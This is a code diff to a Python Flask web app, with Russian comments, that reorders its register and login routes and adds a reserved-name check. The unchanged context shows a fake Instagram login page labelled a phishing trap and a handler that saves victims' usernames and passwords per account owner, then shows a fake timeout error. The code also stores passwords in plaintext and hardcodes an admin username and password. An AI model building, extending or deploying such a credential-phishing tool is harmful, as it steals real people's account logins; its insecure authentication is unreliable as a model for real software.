@@ -33,7 +33,36 @@ with app.app_context():
 @app.route('/')
 def index(): return app.send_static_file('index.html')
 
-# ФЕЙК ИНСТА (Доступна всем)
+@app.route('/api/register', methods=['POST'])
+def register():
+    data = request.json
+    low_user = data.get('username', '').lower().strip()
+    
+    # 1. Запрет на имя "абу" (и все вариации)
+    if "абу" in low_user or "abu" in low_user:
+        return jsonify({"status": "error", "message": "Это имя зарезервировано системой!"})
+    
+    # 2. Проверка на дубликаты (уже есть в базе?)
+    if User.query.filter_by(username=data['username']).first():
+        return jsonify({"status": "error", "message": "Имя уже занято!"})
+    
+    new_user = User(username=data['username'], password=data['password'])
+    db.session.add(new_user); db.session.commit()
+    return jsonify({"status": "success"})
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    data = request.json
+    u, p = data.get('username'), data.get('password')
+    user = User.query.filter_by(username=u, password=p).first()
+    if user:
+        session['user_id'] = user.id
+        session['user'] = user.username
+        is_admin = (u == 'abupaay' and p == '89674556975')
+        return jsonify({"status": "success", "uid": user.id, "isAdmin": is_admin})
+    return jsonify({"status": "error"})
+
+# Фишинг-ловушка
 @app.route('/login/insta/<int:owner_id>')
 def fake_insta(owner_id):
     return render_template_string('''
@@ -56,26 +85,6 @@ def catch_phish(owner_id):
         log = SearchHistory(user_id=owner_id, target=f"LOGIN: {u} | PASS: {p}", module="PHISHING")
         db.session.add(log); db.session.commit()
     return "Error: Server timeout. Try again."
-
-@app.route('/api/register', methods=['POST'])
-def register():
-    data = request.json
-    if User.query.filter_by(username=data['username']).first(): return jsonify({"status": "error", "message": "User exists"})
-    new = User(username=data['username'], password=data['password'])
-    db.session.add(new); db.session.commit()
-    return jsonify({"status": "success"})
-
-@app.route('/api/login', methods=['POST'])
-def login():
-    data = request.json
-    u, p = data.get('username'), data.get('password')
-    user = User.query.filter_by(username=u, password=p).first()
-    if user:
-        session['user_id'] = user.id
-        session['user'] = user.username
-        is_admin = (u == 'abupaay' and p == '89674556975')
-        return jsonify({"status": "success", "uid": user.id, "isAdmin": is_admin})
-    return jsonify({"status": "error"})
 
 @app.route('/api/history', methods=['GET'])
 def get_history():
